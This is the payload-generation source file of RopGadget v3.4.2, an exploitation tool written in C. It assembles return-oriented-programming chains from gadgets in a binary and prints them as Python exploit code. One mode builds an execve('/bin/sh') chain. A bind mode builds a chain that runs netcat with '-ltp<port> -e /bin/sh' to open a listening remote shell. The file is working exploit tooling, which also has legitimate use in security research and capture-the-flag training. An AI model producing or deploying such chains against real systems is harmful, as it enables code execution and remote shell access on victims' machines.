/*
** RopGadget - Release v3.4.2
** Jonathan Salwan - http://twitter.com/JonathanSalwan
** http://shell-storm.org
** 2012-11-11
**
** This program is free software; you can redistribute it and/or modify
** it under the terms of the GNU General Public License as published by
** the Free Software Foundation; either version 2 of the License, or
** (at your option) any later version.
**
** This program is distributed in the hope that it will be useful,
** but WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
** GNU General Public License for more details.
**
** You should have received a copy of the GNU General Public License
** along with this program; if not, write to the Free Software
** Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/
/*
** Make a payload.
** 4 parties:
**
**   1) write "/bin/sh\0" in .data or "/usr/bin/netcat\0" if -bind flag is enable
**   2) registers initialisation
**   3) initialisation of %eax for execve() syscall
**   4) call "int 0x80" or "sysenter"
**
*/

#include "ropgadget.h"

/* linked list for gadgets */
t_makecode *add_element(t_makecode *old_element, char *instruction, Elf32_Addr addr)
{
  t_makecode *new_element;

  new_element = xmalloc(sizeof(t_makecode));
  new_element->addr        = addr;
  new_element->instruction = instruction;
  new_element->next        = old_element;

  return (new_element);
}

/* free linked list */
static void free_add_element(t_makecode *element)
{
  t_makecode *tmp;

  while (element)
    {
      tmp = element;
      element = tmp->next;
      free(tmp);
    }
}

/* returns addr of instruction */
static Elf32_Addr ret_addr_makecodefunc(t_makecode *list_ins, char *instruction)
{
  char  *p;

  while (list_ins)
    {
      p = list_ins->instruction;
      while (*p != 0)
        {
          if (!match(p, instruction, strlen(instruction)))
            return (list_ins->addr);
          p++;
        }
      list_ins = list_ins->next;
    }
  return (0);
}

/* returns the numbers of pop in the gadget. */
static int how_many_pop(char *gadget)
{
  int  cpt = 0;
  char *p;

  p = gadget;
  while(*p != '\0')
    {
      if (!strncmp(p, "pop", 3))
        cpt++;
      p++;
    }
  return (cpt);
}

/* returns first reg in "mov %e?x,(%e?x)" instruction */
static char *get_first_reg(char *gadget)
{
  char *p;

  p = xmalloc(4 * sizeof(char));
  while (*gadget != '(' && *gadget != '\0')
    gadget++;

  gadget -= 4;
  strncpy(p, gadget, 3);
  return (p);
}

/* returns second reg in "mov %e?x,(%e?x)" instruction */
static char *get_second_reg(char *gadget)
{
  char *p;

  p = xmalloc(4 * sizeof(char));
  while (*gadget != '(' && *gadget != '\0')
    gadget++;

  gadget += 2;
  strncpy(p, gadget, 3);
  return (p);
}

/* returns the numbers of "pop" befor pop_reg */
static int how_many_pop_before(char *gadget, char *pop_reg)
{
  int cpt = 0;

  while (strncmp(gadget, pop_reg, strlen(pop_reg)) && *gadget != '\0')
    {
      if (!strncmp(gadget, "pop", 3))
        cpt++;
      gadget++;
    }
  return (cpt);
}

/* returns the numbers of "pop" after pop_reg */
static int how_many_pop_after(char *gadget, char *pop_reg)
{
  int cpt = 0;

  while(strncmp(gadget, pop_reg, strlen(pop_reg)))
    {
      if (*gadget == '\0')
        return (0);
      gadget++;
    }
  gadget += strlen(pop_reg);

  while (*gadget != '\0')
    {
      if (!strncmp(gadget, "pop", 3))
        cpt++;
      gadget++;
    }
  return (cpt);
}

/* display padding */
static void display_padding(int i)
{
  while (i != 0)
    {
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x42424242) # padding%s\n", BLUE, ENDC);
      i--;
    }
}

static void print_code(int word, char *comment)
{
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, word, comment, ENDC);
}

static void print_data_addr(int offset)
{
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + %d%s\n", BLUE, Addr_sData + offset, offset, ENDC);
}

static void print_quad(char *quad)
{
  fprintf(stdout, "\t\t%sp += \"%s\"%s\n", BLUE, quad, ENDC);
}

static void print_quad_int(int quad)
{
  fprintf(stdout, "\t\t%sp += \"%d\"%s\n", BLUE, quad, ENDC);
}

/* partie 1 | write /bin/sh in .data for execve("/bin/sh", NULL, NULL)*/
static void makepartie1_local(t_makecode *list_ins)
{
  Elf32_Addr addr_mov_gadget;
  Elf32_Addr addr_xor_gadget;
  Elf32_Addr addr_pop_stack_gadget;
  Elf32_Addr addr_pop_binsh_gadget;
  char *mov_gadget;
  char *xor_gadget;
  char *pop_stack_gadget;
  char *pop_binsh_gadget;
  char *first_reg;
  char *second_reg;
  char reg_stack[32] = "pop %";
  char reg_binsh[32] = "pop %";
  char instr_xor[32] = "xor %";


  addr_mov_gadget = ret_addr_makecodefunc(list_ins, "mov %e?x,(%e?x)");
  mov_gadget = get_gadget_since_addr_att(addr_mov_gadget);

  first_reg = get_first_reg(mov_gadget);
  second_reg = get_second_reg(mov_gadget);

  strncat(reg_stack, second_reg, 3);
  strncat(reg_binsh, first_reg, 3);
  strncat(instr_xor, first_reg, 3);

  addr_pop_stack_gadget = ret_addr_makecodefunc(list_ins, reg_stack);
  pop_stack_gadget = get_gadget_since_addr_att(addr_pop_stack_gadget);
  addr_pop_binsh_gadget = ret_addr_makecodefunc(list_ins, reg_binsh);
  pop_binsh_gadget = get_gadget_since_addr_att(addr_pop_binsh_gadget);

  addr_xor_gadget = ret_addr_makecodefunc(list_ins, instr_xor);
  xor_gadget = get_gadget_since_addr(addr_xor_gadget);

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  fprintf(stdout, "\t\t%s# execve /bin/sh generated by RopGadget v3.4.2%s\n", BLUE, ENDC);

  /*****************\/bin*********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(0);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad("/bin");
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /*****************\//sh*********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(4);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad("//sh");
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************\0***********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(8);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_xor_gadget, xor_gadget);
  print_code(addr_xor_gadget, xor_gadget);
  display_padding(how_many_pop(xor_gadget));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /******************EOF**********************/

  free(first_reg);
  free(second_reg);
}

/* partie 1 bis | write //usr/bin/netcat -ltp6666 -e///bin//sh in .data */
static void makepartie1_remote(t_makecode *list_ins)
{
  Elf32_Addr addr_mov_gadget;
  Elf32_Addr addr_xor_gadget;
  Elf32_Addr addr_pop_stack_gadget;
  Elf32_Addr addr_pop_binsh_gadget;
  char *mov_gadget;
  char *xor_gadget;
  char *pop_stack_gadget;
  char *pop_binsh_gadget;
  char *first_reg;
  char *second_reg;
  char reg_stack[32] = "pop %";
  char reg_binsh[32] = "pop %";
  char instr_xor[32] = "xor %";


  addr_mov_gadget = ret_addr_makecodefunc(list_ins, "mov %e?x,(%e?x)");
  mov_gadget = get_gadget_since_addr_att(addr_mov_gadget);

  first_reg = get_first_reg(mov_gadget);
  second_reg = get_second_reg(mov_gadget);

  strncat(reg_stack, second_reg, 3);
  strncat(reg_binsh, first_reg, 3);
  strncat(instr_xor, first_reg, 3);

  addr_pop_stack_gadget = ret_addr_makecodefunc(list_ins, reg_stack);
  pop_stack_gadget = get_gadget_since_addr_att(addr_pop_stack_gadget);
  addr_pop_binsh_gadget = ret_addr_makecodefunc(list_ins, reg_binsh);
  pop_binsh_gadget = get_gadget_since_addr_att(addr_pop_binsh_gadget);

  addr_xor_gadget = ret_addr_makecodefunc(list_ins, instr_xor);
  xor_gadget = get_gadget_since_addr(addr_xor_gadget);

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  fprintf(stdout, "\t\t%s# execve /bin/sh bindport %d generated by RopGadget v3.4.2%s\n", BLUE, bind_mode.port, ENDC);

  /*****************\//us*********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(0);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad("//us");
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************r/bi*********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(4);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad("r/bi");
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /*****************\n/ne*********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(8);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad("n/ne");
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************tcat*********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(12);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad("tcat");
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************\0***********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(16);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_xor_gadget, xor_gadget);
  display_padding(how_many_pop(xor_gadget));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /******************EOF**********************/



  /******************-ltp*********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(17);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad("-ltp");
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************<PORT>*******************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(21);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad_int(bind_mode.port);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************\0***********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(25);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_xor_gadget, xor_gadget);
  display_padding(how_many_pop(xor_gadget));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /******************EOF**********************/



  /******************-e//\********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(26);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad("-e//");
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /*****************\/bin*********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(30);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad("/bin");
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************\//sh********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(34);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_quad("//sh");
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************\0***********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(38);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_xor_gadget, xor_gadget);
  display_padding(how_many_pop(xor_gadget));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /******************EOF**********************/


  /*********************************** make now arg_tab[] ***********************************/
  /*
  ** data + 0  = "//usr/bin/netcat"
  ** data + 17 = "-ltp6666"
  ** data + 26 = "-e///bin//sh"
  **                          ^
  **                          +-- data + 38
  **
  ** data + 40 = data + 0
  ** data + 44 = data + 17
  ** data + 48 = data + 26
  ** data + 52 = NULL
  */

  /****************** data + 0 ********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(40);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_data_addr(0);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************  EOF  **********************/

  /****************** data + 17 ********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(44);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_data_addr(17);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************  EOF  **********************/

  /****************** data + 17 ********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(48);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_pop_binsh_gadget, pop_binsh_gadget);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  print_data_addr(26);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /*******************  EOF  **********************/

  /****************** \0 [1] ***********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(52);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_xor_gadget, xor_gadget);
  display_padding(how_many_pop(xor_gadget));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /****************** EOF **************************/

  /****************** \0 [2] ***********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(53);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_xor_gadget, xor_gadget);
  display_padding(how_many_pop(xor_gadget));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /****************** EOF **************************/

  /****************** \0 [3] ***********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(54);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_xor_gadget, xor_gadget);
  display_padding(how_many_pop(xor_gadget));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /****************** EOF **************************/

  /****************** \0 [4] ***********************/
  print_code(addr_pop_stack_gadget, pop_stack_gadget);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  print_data_addr(55);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  print_code(addr_xor_gadget, xor_gadget);
  display_padding(how_many_pop(xor_gadget));
  print_code(addr_mov_gadget, mov_gadget);
  display_padding(how_many_pop(mov_gadget));
  /****************** EOF **************************/

  /**************************************** EOF *********************************************/

  free(first_reg);
  free(second_reg);
}

/* local: partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 2 bis init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
static void makepartie2(t_makecode *list_ins, int local)
{
  Elf32_Addr addr_pop_ebx;
  Elf32_Addr addr_pop_ecx;
  Elf32_Addr addr_pop_edx;
  char *pop_ebx_gadget;
  char *pop_ecx_gadget;
  char *pop_edx_gadget;

  addr_pop_ebx = ret_addr_makecodefunc(list_ins, "pop %ebx");
  addr_pop_ecx = ret_addr_makecodefunc(list_ins, "pop %ecx");
  addr_pop_edx = ret_addr_makecodefunc(list_ins, "pop %edx");
  pop_ebx_gadget = get_gadget_since_addr_att(addr_pop_ebx);
  pop_ecx_gadget = get_gadget_since_addr_att(addr_pop_ecx);
  pop_edx_gadget = get_gadget_since_addr_att(addr_pop_edx);

  /* set %ebx */
  print_code(addr_pop_ebx, pop_ebx_gadget);
  display_padding(how_many_pop_before(pop_ebx_gadget, "pop %ebx"));
  print_data_addr(0);
  display_padding(how_many_pop_after(pop_ebx_gadget, "pop %ebx"));

  /* set %ecx */
  print_code(addr_pop_ecx, pop_ecx_gadget);
  display_padding(how_many_pop_before(pop_ecx_gadget, "pop %ecx"));
  if (local) {
    print_data_addr(8);
  } else {
    print_data_addr(40);
  }
  display_padding(how_many_pop_after(pop_ecx_gadget, "pop %ecx"));

  /* set %edx */
  print_code(addr_pop_edx, pop_edx_gadget);
  display_padding(how_many_pop_before(pop_edx_gadget, "pop %edx"));
  if (local) {
    print_data_addr(8);
  } else {
    print_data_addr(52);
  }
  display_padding(how_many_pop_after(pop_edx_gadget, "pop %edx"));
}

/* partie 3 init eax = 0xb (execve) */
static void makepartie3(t_makecode *list_ins)
{
  Elf32_Addr addr_xor_eax;
  Elf32_Addr addr_inc_eax;
  char *xor_eax_gadget;
  char *inc_eax_gadget;
  int i = 0;

  addr_xor_eax = ret_addr_makecodefunc(list_ins, "xor %eax,%eax");
  addr_inc_eax = ret_addr_makecodefunc(list_ins, "inc %eax");
  xor_eax_gadget = get_gadget_since_addr_att(addr_xor_eax);
  inc_eax_gadget = get_gadget_since_addr_att(addr_inc_eax);

  /* set %eax => 0 */
  print_code(addr_xor_eax, xor_eax_gadget);
  display_padding(how_many_pop(xor_eax_gadget));

  /* set %eax => 0xb for sys_execve() */
  while (i != 0xb)
    {
      print_code(addr_inc_eax, inc_eax_gadget);
      display_padding(how_many_pop(inc_eax_gadget));
      i++;
    }
}

/* partie 4 call "int 0x80" or "sysenter" */
static void makepartie4(t_makecode *list_ins)
{
  Elf32_Addr addr_int_0x80;
  Elf32_Addr addr_sysenter;
  Elf32_Addr addr_pop_ebp;
  char *pop_ebp_gadget;

  addr_int_0x80 = ret_addr_makecodefunc(list_ins, "int $0x80");
  addr_sysenter = ret_addr_makecodefunc(list_ins, "sysenter");
  addr_pop_ebp  = ret_addr_makecodefunc(list_ins, "pop %ebp");
  pop_ebp_gadget = get_gadget_since_addr_att(addr_pop_ebp);

  if (addr_int_0x80)
    print_code(addr_int_0x80, "int $0x80");
  else if (addr_sysenter)
    {
      print_code(addr_pop_ebp, pop_ebp_gadget);
      print_data_addr(0);
      print_code(addr_sysenter, "sysenter");
    }
}

void makecode(t_makecode *list_ins)
{
  if (!bind_mode.flag)
    {
      makepartie1_local(list_ins);
    }
  else
    {
      makepartie1_remote(list_ins);
    }
  makepartie2(list_ins, !bind_mode.flag);
  makepartie3(list_ins);
  makepartie4(list_ins);
  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
  free_add_element(list_ins);
}
